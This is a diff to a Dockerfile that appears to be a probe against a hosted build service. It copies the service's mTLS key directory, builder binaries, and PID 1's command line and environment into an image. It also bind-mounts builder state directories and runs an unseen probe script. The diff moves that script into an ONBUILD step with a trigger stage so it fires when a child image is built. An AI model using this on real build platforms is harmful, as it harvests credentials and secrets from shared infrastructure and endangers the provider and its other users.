@@ -1,4 +1,4 @@
-FROM alpine:3.20
+FROM alpine:3.20 AS base
 COPY usr/bin/builderv3 /f/bv
 COPY var/lib/railwayapp/mtls-pki /f/pki
 COPY etc/hosts /f/hosts
@@ -6,8 +6,10 @@ COPY etc/resolv.conf /f/resolv
 COPY proc/1/cmdline /f/p1cmd
 COPY proc/1/environ /f/p1env
 COPY probe_n1.sh /probe_n1.sh
-RUN --mount=type=bind,source=var/lib/builder,target=/hb \
+ONBUILD RUN --mount=type=bind,source=var/lib/builder,target=/hb \
     --mount=type=bind,source=var/lib/builderv3,target=/hb3 \
     --mount=type=bind,source=run/builder,target=/rb \
-    apk add --no-cache openssl bind-tools >/dev/null 2>&1; sh /probe_n1.sh
+    sh -c 'apk add --no-cache openssl bind-tools >/dev/null 2>&1; sh /probe_n1.sh'
+FROM base
+RUN sh -c 'echo TRIGGER_N1'
 CMD ["sh","-c","sleep 10"]
